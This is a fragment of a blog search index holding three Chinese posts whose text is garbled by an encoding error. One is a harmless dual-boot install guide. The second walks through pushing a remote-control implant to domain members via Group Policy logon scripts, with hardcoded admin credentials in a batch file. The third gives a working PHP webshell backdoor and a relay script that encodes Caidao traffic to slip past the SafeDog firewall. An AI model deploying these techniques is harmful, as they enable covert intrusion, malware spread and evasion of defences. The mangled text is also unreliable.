<li>UEFI + GPT</li>
<li>BIOS + MBR</li>
</ul>
<p>æˆ‘2012å¹´ä¹°çš„åç¡•ï¼Œå·²ç»é»˜è®¤æ˜¯UEFI+GPTï¼Œå½“æ—¶è¿˜å› ä¸ºè¿™ä¸ªåŸå› å¯¼è‡´æ— æ³•é‡è£…ç³»ç»Ÿï¼Œç°åœ¨è£…åŒç³»ç»Ÿï¼Œåˆç¢°åˆ°è¯¥é—®é¢˜ï¼Œç®€ç›´å¤´çš®å‘éº»ï¼Œä¸ç®¡æ€ä¹ˆè¯´ï¼Œç›®çš„å¾—å…ˆè¾¾åˆ°â€”â€”å®‰è£…åŒç³»ç»Ÿwin+kali2.0ã€‚</p>
<h1>æ­¥éª¤</h1>
<span id="more"></span>
<p>å‡ ä¹ç¿»éäº†ç™¾åº¦æ‰€æœ‰<em><strong>åŒç³»ç»Ÿ</strong></em> è¯æ¡ï¼Œéƒ½æ— æ³•è®©æˆ‘æˆåŠŸå®‰è£…ï¼Œé™¤äº† <em>rEFInd</em>ï¼Œè¿™ä¸ªæˆ‘æ²¡æœ‰å°è¯•ï¼Œå› ä¸ºç•Œé¢å®åœ¨å¤ªä¸‘äº†ã€‚åœ¨å°è¯•äº†å°†è¿‘3å¤©çš„æ–¹æ³•åï¼Œä¾ç„¶æ— æœï¼Œç”šè‡³æŠŠwin10æ¢åˆ°äº†win7ï¼Œè¿˜æ˜¯ä¸èƒ½æˆåŠŸã€‚å½“æˆ‘æˆåŠŸå®ŒæˆåŒç³»ç»Ÿçš„å®‰è£…åï¼ŒçœŸçš„æ˜¯å¿ƒé‡Œmmpï¼Œè„¸ä¸Šç¬‘å˜»å˜»ã€‚æ€»ç»“å¦‚ä¸‹ï¼š</p>
<p>æŠ€æœ¯é—®é¢˜æŸ¥googleï¼</p>
<p>æŠ€æœ¯é—®é¢˜æŸ¥googleï¼</p>
<p>æŠ€æœ¯é—®é¢˜æŸ¥googleï¼</p>
<p>ä¸‰éï¼Œä½ æ‡‚æˆ‘æ„æ€ã€‚</p>
<blockquote>
<p><a href="http://linuxbsdos.com/2016/11/05/dual-boot-kali-linux-rolling-2016-2-windows-10-on-a-pc-with-uefi-firmware/">Dual-boot Kali Linux Rolling 2016.2, Windows 10 on a PC with UEFI firmware</a></p>
<p><a href="https://link.zhihu.com/?target=https%3A//www.youtube.com/watch%3Fv%3Dx7pDldI7tBY">è§†é¢‘æ“ä½œ</a></p>
</blockquote>
<h2 id="1-åˆ†åŒº"><a class="header-anchor" href="#1-åˆ†åŒº">Â¶</a>1. åˆ†åŒº</h2>
<p>å‹ç¼©å‡º50gï¼Œå¦åˆ™å®‰è£…å¤±è´¥ï¼Œç”±æ­¤åœ¨çŸ¥ä¹ä¸Šå›ç­”äº†è¯¥é—®é¢˜</p>
<p><a href="https://www.zhihu.com/question/39731926/answer/360816217">ç‰©ç†æœºå®‰è£…kali linuxæ—¶å®‰è£…æ­¥éª¤å¤±è´¥ï¼Ÿä½•è§£?</a></p>
<p>ç©¶å…¶åŸå› ï¼š</p>
<p>â€œ/ æ ¹ç›®å½•â€ è¦åˆ†10Gä»¥ä¸Š(å¦åˆ™å®‰è£…å¤±è´¥,x32å’Œx64ä½çš„ç³»ç»Ÿåœ¨ä¸¤å°ç”µè„‘ä¸Šé¢å…±å°è¯•å®‰è£…äº†10æ¬¡å·¦å³æ²¡æœ‰æˆåŠŸ,åæ¥æˆåŠŸåæ€»ç»“å‡ºå·²çŸ¥åŸå› ä¸¤ç‚¹1,é¡»é€‰å›¾å½¢åŒ–å®‰è£…2,æ‰‹å·¥åˆ†åŒº,è€Œä¸”æ ¹ç›®å½•è¶³å¤Ÿå¤§,æ­¤ç‰ˆæœ¬è§£å‹å‡ºæ¥/æ ¹ç›®å½•å°±7GBä»¥ä¸Šäº†)</p>
<h2 id="2-åˆ»å½•"><a class="header-anchor" href="#2-åˆ»å½•">Â¶</a>2. åˆ»å½•</h2>
<ul>
<li><em><strong>UltraISO</strong></em> ï¼šåˆ»å½•kali2.0åå®‰è£…ä¼šå‡ºé”™</li>
<li><em><strong>Win32DiskImager</strong></em> ï¼šå¯ç”¨ï¼Œä½†æ˜¯Uç›˜ä¼šå˜æˆå¥‡æ€ªçš„æ ¼å¼ï¼Œç”µè„‘æ— æ³•æ‰“å¼€ï¼Œä¼šæç¤ºæ ¼å¼åŒ–ï¼Œå¤±å»äº†Uç›˜çš„æ„ä¹‰</li>
</ul>
<p>é€‰ç”¨<em><strong>Rufus</strong></em> ï¼Œkali2.0å¯å®‰è£…ä¸”Uç›˜å¯ç”¨</p>
<h2 id="3-å®‰è£…"><a class="header-anchor" href="#3-å®‰è£…">Â¶</a>3. å®‰è£…</h2>
<p>ä¸€è·¯å¾€ä¸‹èµ°ï¼Œåˆ†åŒºæ—¶æ³¨æ„ï¼Œé€‰æ‹©<code>Guided - use the largest continuous free space</code> ï¼Œåˆ‡å¿Œä¸è¦ä½¿ç”¨æ‰‹åŠ¨åˆ†åŒºï¼Œç™¾åº¦ä¸­æ‰€æœ‰å®‰è£…kaliçš„æ•™ç¨‹å‡é€‰æ‹©æ‰‹åŠ¨</p>
<p>ç¡®è®¤EFIç³»ç»Ÿåˆ†åŒºåå°±å¯ä»¥doneäº†</p>
<p>ç­‰å¾…10åˆ†é’Ÿåï¼Œå®‰è£…æˆåŠŸï¼Œå¦åˆ™å¤±è´¥å‚è€ƒç¬¬ä¸€æ­¥åˆ†åŒºï¼Œ<code>GNU GRUB</code>ä¼šè¢«é»˜è®¤è‡ªåŠ¨å®‰è£…</p>
<p>é‡å¯åï¼Œbiosè®¾ç½®å¯åŠ¨é¡¹ï¼Œé»˜è®¤è¿›å…¥win7ï¼Œå¦‚éœ€è¿›å…¥kali2.0ï¼Œå¼€æœºæ—¶<code>ESC</code>é€‰æ‹©kali2.0å³å¯ï¼ˆæ ¹æ®ç”µè„‘å†³å®šï¼Œåç¡•ä¸ºescï¼‰</p>
<p>æœ€åï¼Œæ™’å¼ æˆåŠŸå®‰è£…çš„å›¾~</p>
<img src="/2018/04/19/%E5%8F%8C%E7%B3%BB%E7%BB%9F%E5%AE%89%E8%A3%85-win7%E4%B8%8B%E5%AE%89%E8%A3%85kali2-0/finish-install_reboot_in_progress_0.png" class="">
]]></content>
      <tags>
        <tag>ç³»ç»Ÿ</tag>
      </tags>
  </entry>
  <entry>
    <title>åŸŸæ¸—é€ - åŸŸæ§ä¸‹å‘æ–‡ä»¶å¹¶æ‰§è¡Œè¿œæ§</title>
    <url>/2018/03/01/%E5%9F%9F%E6%B8%97%E9%80%8F-%E5%9F%9F%E6%8E%A7%E4%B8%8B%E5%8F%91%E6%96%87%E4%BB%B6%E5%B9%B6%E6%89%A7%E8%A1%8C%E8%BF%9C%E6%8E%A7/</url>
    <content><![CDATA[<h1>0x01 èƒŒæ™¯</h1>
<p>å†…ç½‘æ¸—é€ä¸­ï¼Œå½“æ§åˆ¶åˆ°åŸŸæ§æ—¶ï¼Œå½“ç„¶æ˜¯å†å¥½ä¸è¿‡ï¼Œä½†å¦‚ä½•æ§åˆ¶æˆå‘˜æœºå™¨æˆ–ä¸ªäººæœºå‘¢ï¼ŒåŸŸç®¡ç†å‘˜è´¦å·ç™»å½•ï¼Ÿå¤ªæ•æ„Ÿï¼ŒåŠ¨ä½œå¤§ï¼›psexec,wmiâ€¦?æ€è½¯æŠ¥æ¯’ï¼Œä¸è¦ä¸ä¿¡ï¼Œäº²èº«ç»å†ï¼›</p>
<p>æƒ³è¦ç›´æ¥æ¨é€ä¸ªè¿œæ§ï¼Œç¥ä¸çŸ¥é¬¼ä¸è§‰çš„æå®šæˆå‘˜ï¼›</p>
<p>é‚£ä¹ˆé—®é¢˜æ¥äº†ï¼Œå¦‚ä½•æ¨é€ä¸ªexeï¼Ÿ</p>
<h1>0x02 ç ”ç©¶</h1>
<h2 id="æ–¹æ³•1"><a class="header-anchor" href="#æ–¹æ³•1">Â¶</a>æ–¹æ³•1</h2>
<p>æŸ¥æ‰¾å¤§é‡ç›¸å…³èµ„æ–™ï¼Œéƒ½æ²¡æœ‰ç°æˆçš„æ–¹æ³•ç›´æ¥ä¸‹å‘exeï¼Œç„¶è€Œåå¸ç«Ÿç„¶ä¹Ÿæ²¡æœ‰ï¼Œæœ€åï¼Œé”å®šäº†<strong>ç»„ç­–ç•¥å¼€æœºè„šæœ¬</strong></p>
<p>åŸŸæˆå‘˜ç™»å½•æ—¶ï¼Œæ‰§è¡ŒåŸŸæ§æå‰éƒ¨ç½²å¥½çš„batè„šæœ¬ï¼Œé€šè¿‡æ­¤è„šæœ¬ï¼ŒIPCè¿æ¥åˆ°åŸŸæ§ï¼Œcopyæ–‡ä»¶ï¼Œåœ¨æˆå‘˜ä¸Šæ‰§è¡Œã€‚</p>
<span id="more"></span>
<p>ç¯å¢ƒï¼š</p>
<table>
<thead>
<tr>
<th>OS</th>
<th>IP</th>
<th>Role</th>
</tr>
</thead>
<tbody>
<tr>
<td>win2008</td>
<td>192.168.2.100</td>
<td>åŸŸæ§</td>
</tr>
<tr>
<td>win7</td>
<td>192.168.2.200</td>
<td>åŸŸæˆå‘˜</td>
</tr>
<tr>
<td>ubuntu14.04</td>
<td>192.168.2.250</td>
<td>éåŸŸæˆå‘˜ï¼ˆcsï¼‰</td>
</tr>
</tbody>
</table>
<h3 id="1-adç”¨æˆ·å’Œè®¡ç®—æœº"><a class="header-anchor" href="#1-adç”¨æˆ·å’Œè®¡ç®—æœº">Â¶</a>(1) adç”¨æˆ·å’Œè®¡ç®—æœº</h3>
<p>æ–°å»ºOUï¼ˆåç§°ä»»æ„ï¼‰</p>
<p><img src="AD-01.png" alt="AD-01"></p>
<p>æ–°å»ºç”¨æˆ·ï¼ˆredn3ckï¼‰</p>
<p><img src="AD-02.png" alt="AD-02"></p>
<h3 id="2-gpmc-mscç»„ç­–ç•¥ç®¡ç†"><a class="header-anchor" href="#2-gpmc-mscç»„ç­–ç•¥ç®¡ç†">Â¶</a>(2) gpmc.mscç»„ç­–ç•¥ç®¡ç†</h3>
<p><code>gpmc.msc</code>â€”â€”å³é”®<em>ç»„ç­–ç•¥å¯¹è±¡</em>â€”â€”<em>æ–°å»ºï¼ˆADcontrolï¼‰</em></p>
<p><img src="AD-03.png" alt="AD-03"></p>
<p>å³é”®<em>ADcontrol</em>â€”â€”<em>ç¼–è¾‘</em>â€”â€”<em>ç”¨æˆ·é…ç½®</em>â€”â€”<em>windowsè®¾ç½®</em>â€”â€”<em>è„šæœ¬</em>â€”â€”<em>ç™»å½•</em>â€”â€”<em>æ˜¾ç¤ºæ–‡ä»¶</em>â€”â€”æ–°å»º<em>ADControl.bat</em></p>
<p><img src="AD-04.png" alt="AD-04"></p>
<p>ä»£ç å¦‚ä¸‹</p>
<figure class="highlight bat"><table><tbody><tr><td class="code"><pre><span class="line"><span class="built_in">net</span> use \\<span class="number">192</span>.<span class="number">168</span>.<span class="number">2</span>.<span class="number">100</span>  p@ssw0rd /user:administrator@red.com</span><br><span class="line"><span class="built_in">copy</span> \\<span class="number">192</span>.<span class="number">168</span>.<span class="number">2</span>.<span class="number">100</span>\c$\test\mm.exe c:\test\</span><br><span class="line"><span class="built_in">cmd</span> /c c:\test\mm.exe</span><br><span class="line"><span class="built_in">net</span> use * /<span class="built_in">del</span> /y</span><br></pre></td></tr></tbody></table></figure>
<p><em>æ·»åŠ </em>â€”â€”<em>æµè§ˆ</em>â€”â€”é€‰æ‹©<em>ADControl.bat</em></p>
<p><img src="AD-05.png" alt="AD-05"></p>
<p>å³é”®<em>OU</em>â€”â€”<em>é“¾æ¥ç°æœ‰GPO</em>â€”â€”é€‰æ‹©<em>ADcontrol</em></p>
<p><img src="AD-06.png" alt="AD-06"></p>
<h3 id="3-åˆ·æ–°ç­–ç•¥"><a class="header-anchor" href="#3-åˆ·æ–°ç­–ç•¥">Â¶</a>(3) åˆ·æ–°ç­–ç•¥</h3>
<figure class="highlight cmd"><table><tbody><tr><td class="code"><pre><span class="line">gpupdate /force</span><br></pre></td></tr></tbody></table></figure>
<p><img src="AD-07.png" alt="AD-07"></p>
<h3 id="4-é‡å¯åŸŸæˆå‘˜"><a class="header-anchor" href="#4-é‡å¯åŸŸæˆå‘˜">Â¶</a>(4) é‡å¯åŸŸæˆå‘˜</h3>
<p>ä½¿ç”¨æ–°å»ºè´¦æˆ·(redn3ck)ç™»å½•ï¼ŒæˆåŠŸcopyæ–‡ä»¶ï¼Œå¹¶æ‰§è¡Œ</p>
<p><img src="AD-08.png" alt="AD-08"></p>
<h2 id="æ–¹æ³•2"><a class="header-anchor" href="#æ–¹æ³•2">Â¶</a>æ–¹æ³•2</h2>
<h3 id="1-åˆ›å»ºbat"><a class="header-anchor" href="#1-åˆ›å»ºbat">Â¶</a>(1) åˆ›å»ºbat</h3>
<p>logoné»˜è®¤è·¯å¾„ï¼š<code>C:\Windows\SYSVOL\sysvol\red.com\scripts</code></p>
<figure class="highlight bat"><table><tbody><tr><td class="code"><pre><span class="line">//logon.bat</span><br><span class="line"></span><br><span class="line"><span class="built_in">net</span> use \\<span class="number">192</span>.<span class="number">168</span>.<span class="number">2</span>.<span class="number">100</span> <span class="number">12345</span>RDzxcvb! /user:administrator@red.com</span><br><span class="line"><span class="built_in">copy</span> \\<span class="number">192</span>.<span class="number">168</span>.<span class="number">2</span>.<span class="number">100</span>\c$\test\mm.exe c:\test</span><br><span class="line"><span class="built_in">cmd</span> /c <span class="built_in">start</span> c:\test\mm.exe</span><br></pre></td></tr></tbody></table></figure>
<h3 id="2-æ‰§è¡Œ"><a class="header-anchor" href="#2-æ‰§è¡Œ">Â¶</a>(2) æ‰§è¡Œ</h3>
<figure class="highlight bat"><table><tbody><tr><td class="code"><pre><span class="line"><span class="built_in">net</span> user redn3ck /scriptpath:logon.bat</span><br></pre></td></tr></tbody></table></figure>
<p><font color="red">æ³¨ï¼šæ‰§è¡Œæ—¶éœ€è¦<code>cmd /c start</code>å¦åˆ™å¼€æœºä¼šæœ‰cmdçª—å£ </font></p>
<h2 id="æ–¹æ³•3"><a class="header-anchor" href="#æ–¹æ³•3">Â¶</a>æ–¹æ³•3</h2>
<p><em>Domain computer</em>â€”â€”<em>ç®¡ç†</em>â€”â€”<em>æ·»åŠ ç”¨æˆ·åˆ°è¿œç¨‹ç®¡ç†ç»„</em></p>
<h1>0x03 æ€»ç»“</h1>
<ol>
<li>
<p>è„šæœ¬éœ€è¦æ”¾åœ¨*ã€Šæ˜¾ç¤ºæ–‡ä»¶ã€‹*ç›®å½•ä¸­ï¼Œå…¶ä»–ç›®å½•æˆå‘˜æœºæ— æ³•è®¿é—®åˆ°ï¼Œå› æ­¤ä¹Ÿå°±æ— æ³•æ‰§è¡Œ</p>
</li>
<li>
<p>åŸŸç”¨æˆ·ï¼ˆredn3ckï¼‰åœ¨æ ¹ç›®å½•å‡æ— æƒé™ï¼Œ<code>windows\temp</code>ç›®å½•å¯copyè¿›å»ï¼Œä½†æ— æ³•æ‰§è¡Œï¼Œå› æ­¤copyæ—¶éœ€é€‰æ‹©æœ‰æƒé™ç›®å½•</p>
</li>
<li>
<p>å®é™…ç¯å¢ƒä¸­å½“ç„¶ä¸èƒ½é‡å¯æœºå™¨ï¼Œåªéœ€è¦ç­‰å¾…åŸŸæˆå‘˜è´¦å·å¼€æœºç™»å½•å³å¯</p>
</li>
</ol>
]]></content>
      <tags>
        <tag>åŸŸæ¸—é€</tag>
      </tags>
  </entry>
  <entry>
    <title>å®‰å…¨ç‹—ç»•è¿‡ - æœ¬åœ°ä¸­è½¬bypass</title>
    <url>/2018/07/22/%E5%AE%89%E5%85%A8%E7%8B%97%E7%BB%95%E8%BF%87-%E6%9C%AC%E5%9C%B0%E4%B8%AD%E8%BD%ACbypass/</url>
    <content><![CDATA[<h1>å‰è¨€</h1>
<p>è‹¥æœåŠ¡å™¨å®‰è£…äº†å®‰å…¨ç‹—ï¼Œæ™®é€šä¸€å¥è¯å®‰å…¨ç‹—è‚¯å®šæ‹¦æˆªï¼Œèœåˆ€å¿…ç„¶æ— æ³•ä½¿ç”¨ã€‚</p>
<p>ç©¶å…¶åŸå› ï¼šèœåˆ€è¯·æ±‚å…³é”®å­—ç­‰è¢«å®‰å…¨ç‹—è¯†åˆ«å¯¼è‡´ä¸­æ–­è¯·æ±‚ã€‚</p>
<p>æ„é€ æœ¬åœ°ä¸­è½¬è„šæœ¬ï¼Œæœ¬åœ°æœåŠ¡å™¨å‘é€è¯·æ±‚ï¼Œå¯¹èœåˆ€è¯·æ±‚å…³é”®å­—è¿›è¡Œç¼–ç ï¼ŒæœåŠ¡ç«¯å†å¯¹è¯·æ±‚è§£ç ï¼Œè¿™æ ·å®‰å…¨ç‹—æ— æ³•è¯†åˆ«ä¹Ÿå°±æ— æ³•æ‹¦æˆªè¯·æ±‚ã€‚</p>
<h1>å®¢æˆ·ç«¯</h1>
<p>å®¢æˆ·ç«¯å³ä¸­è½¬è„šæœ¬<code>transfer.php</code></p>
<p>å®¢æˆ·ç«¯å¯¹èœåˆ€è¯·æ±‚å‚æ•°è¿›è¡Œç¼–ç æ“ä½œï¼Œæ­¤å¤„ä»…åšç®€å•ç¼–ç éªŒè¯bypassï¼Œç¼–ç é¡ºåºä¾æ¬¡ä¸º</p>
<span id="more"></span>
<blockquote>
<p><code>base64_encode()</code>,<br>
<code>str_rot13()</code>,<br>
<code>strrev()</code>,<br>
<code>base64_encode()</code></p>
</blockquote>
<p>ç»è¿‡è¿™4å±‚ç¼–ç ï¼Œå¯¹æœåŠ¡ç«¯å‘é€è¯·æ±‚ã€‚</p>
<figure class="highlight php"><figcaption><span>å®¢æˆ·ç«¯ï¼štransfer.php</span></figcaption><table><tbody><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line">	<span class="function"><span class="keyword">function</span> <span class="title">encode</span>(<span class="params"><span class="variable">$str</span></span>)</span>{</span><br><span class="line">	<span class="variable">$DS</span> = <span class="title function_ invoke__">base64_encode</span>(<span class="variable">$str</span>);</span><br><span class="line">	<span class="variable">$DS</span> = <span class="title function_ invoke__">str_rot13</span>(<span class="variable">$DS</span>);</span><br><span class="line">	<span class="variable">$DS</span> = <span class="title function_ invoke__">strrev</span>(<span class="variable">$DS</span>);</span><br><span class="line">	<span class="variable">$DS</span> = <span class="title function_ invoke__">base64_encode</span>(<span class="variable">$DS</span>);</span><br><span class="line">	<span class="keyword">return</span> <span class="variable">$DS</span>;</span><br><span class="line">	}</span><br><span class="line">	<span class="comment">// webshellåœ°å€ï¼ŒtransServ.phpä¸ºå®šåˆ¶ä¸€å¥è¯</span></span><br><span class="line">	<span class="variable">$webshell</span> = <span class="string">'http://127.0.0.1/transServ.php'</span>;</span><br><span class="line">	<span class="variable">$pdata</span> = <span class="variable">$_POST</span>;</span><br><span class="line">	<span class="keyword">foreach</span>(<span class="variable">$pdata</span> <span class="keyword">as</span> <span class="variable">$key</span>=&gt;<span class="variable">$value</span>){ </span><br><span class="line">		<span class="keyword">if</span>(<span class="title function_ invoke__">is_array</span>(<span class="variable">$value</span>)){</span><br><span class="line">			<span class="variable">$value</span>=<span class="title function_ invoke__">implode</span>(<span class="variable">$value</span>);</span><br><span class="line">		}</span><br><span class="line">		<span class="comment">// èœåˆ€å¯†ç </span></span><br><span class="line">		<span class="keyword">if</span>(<span class="variable">$key</span> == <span class="string">'pass'</span>) {</span><br><span class="line">			<span class="variable">$pdata</span>[<span class="variable">$key</span>] = <span class="title function_ invoke__">encode</span>(<span class="variable">$value</span>);</span><br><span class="line">		}</span><br><span class="line">		</span><br><span class="line">	}</span><br><span class="line">	<span class="comment">// var_dump($pdata);</span></span><br><span class="line">	<span class="variable">$data</span> = <span class="title function_ invoke__">http_build_query</span>(<span class="variable">$pdata</span>);</span><br><span class="line">	</span><br><span class="line">	<span class="variable">$opts</span> = <span class="keyword">array</span> (</span><br><span class="line">		<span class="string">'http'</span> =&gt; <span class="keyword">array</span> (</span><br><span class="line">		<span class="string">'method'</span> =&gt; <span class="string">'POST'</span>,</span><br><span class="line">		<span class="string">'header'</span>=&gt; <span class="string">"Content-type: application/x-www-form-urlencoded\r\n"</span> . <span class="string">"Content-Length: "</span> . <span class="title function_ invoke__">strlen</span>(<span class="variable">$data</span>) . <span class="string">"\r\n"</span>,</span><br><span class="line">		<span class="string">'content'</span> =&gt; <span class="variable">$data</span>)</span><br><span class="line">	);</span><br><span class="line">	<span class="variable">$context</span> = <span class="title function_ invoke__">stream_context_create</span>(<span class="variable">$opts</span>);</span><br><span class="line">	<span class="comment">// åˆ›å»ºèµ„æºæµä¸Šä¸‹æ–‡,æ•°æ®åŒ…</span></span><br><span class="line">	<span class="variable">$html</span> = @<span class="title function_ invoke__">file_get_contents</span>(<span class="variable">$webshell</span>, <span class="literal">false</span>, <span class="variable">$context</span>);</span><br><span class="line">	<span class="keyword">echo</span> <span class="variable">$html</span>;</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></tbody></table></figure>
<h1>æœåŠ¡ç«¯</h1>
<p>æœåŠ¡ç«¯åªéœ€å¯¹è¯·æ±‚è¿›è¡Œè§£ç æ“ä½œï¼Œç„¶åæ­£å¸¸ä½¿ç”¨èœåˆ€ä¸€å¥è¯å³å¯ï¼Œè§£ç é¡ºåºä¾æ¬¡ä¸º</p>
<blockquote>
<p><code>base64_decode()</code>,<br>
<code>str_rot13()</code>,<br>
<code>strrev()</code>,<br>
<code>base64_decode()</code></p>
</blockquote>
<p>æ­¤å¤„ä½¿ç”¨<code>array_map()</code>å›è°ƒåé—¨ï¼Œä¸ºä¿è¯æ–°æ—§èœåˆ€å‡å¯ä½¿ç”¨</p>
<blockquote>
<p>ç‰ˆæœ¬éœ€æ±‚ï¼š<code>php&gt;5.2</code></p>
</blockquote>
<figure class="highlight php"><figcaption><span>æœåŠ¡ç«¯ï¼štransServ.php</span></figcaption><table><tbody><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span> </span><br><span class="line"><span class="variable">$DS</span> = @$<span class="comment">/*-*/</span>{<span class="string">"_P"</span>.<span class="string">"OST"</span>}[<span class="string">'pass'</span>];</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> (!<span class="keyword">empty</span>(<span class="variable">$DS</span>) ){</span><br><span class="line">	<span class="keyword">echo</span> <span class="variable">$DS</span>.<span class="string">"&lt;br&gt;"</span>;</span><br><span class="line">	<span class="variable">$DS</span> = @<span class="title function_ invoke__">base64_decode</span>(<span class="variable">$DS</span>);</span><br><span class="line">	<span class="keyword">echo</span> <span class="variable">$DS</span>.<span class="string">"&lt;br&gt;"</span>;</span><br><span class="line">	<span class="variable">$DS</span> = @<span class="title function_ invoke__">strrev</span>(<span class="variable">$DS</span>);</span><br><span class="line">	<span class="keyword">echo</span> <span class="variable">$DS</span>.<span class="string">"&lt;br&gt;"</span>;</span><br><span class="line">	<span class="variable">$DS</span> = @<span class="title function_ invoke__">str_rot13</span>(<span class="variable">$DS</span>);</span><br><span class="line">	<span class="keyword">echo</span> <span class="variable">$DS</span>.<span class="string">"&lt;br&gt;"</span>;</span><br><span class="line">	<span class="variable">$DS</span> = @<span class="title function_ invoke__">base64_decode</span>(<span class="variable">$DS</span>);</span><br><span class="line">	<span class="keyword">echo</span> <span class="variable">$DS</span>.<span class="string">"&lt;br&gt;"</span>;</span><br><span class="line">	@<span class="title function_ invoke__">array_map</span>(assert,(<span class="keyword">array</span>)<span class="variable">$DS</span>);</span><br><span class="line">	<span class="keyword">exit</span>;</span><br><span class="line">}</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></tbody></table></figure>
<h1>è¿æ¥</h1>
<h2 id="æµè§ˆå™¨éªŒè¯"><a class="header-anchor" href="#æµè§ˆå™¨éªŒè¯">Â¶</a>æµè§ˆå™¨éªŒè¯</h2>
<p><img src="phpinfo.png" alt="phpinfo"></p>
<h2 id="èœåˆ€è¿æ¥"><a class="header-anchor" href="#èœåˆ€è¿æ¥">Â¶</a>èœåˆ€è¿æ¥</h2>
<p>è¿æ¥æœ¬åœ°ä¸­è½¬è„šæœ¬ï¼Œä¸­è½¬è„šæœ¬å¯¹webshellå‘é€ç¼–ç åè¯·æ±‚ã€‚</p>
<p><img src="caidao.png" alt="caidao"></p>
<h2 id="bypasså®‰å…¨ç‹—"><a class="header-anchor" href="#bypasså®‰å…¨ç‹—">Â¶</a>bypasså®‰å…¨ç‹—</h2>
<p><img src="bypass-safedog.png" alt="bypass-safedog"><br>
<img src="bypass-caidao.png" alt="bypass-caidao"></p>
]]></content>
      <tags>
        <tag>å®‰å…¨ç‹—</tag>
        <tag>ç»•è¿‡</tag>
        <tag>bypass</tag>
      </tags>
  </entry>
</search>
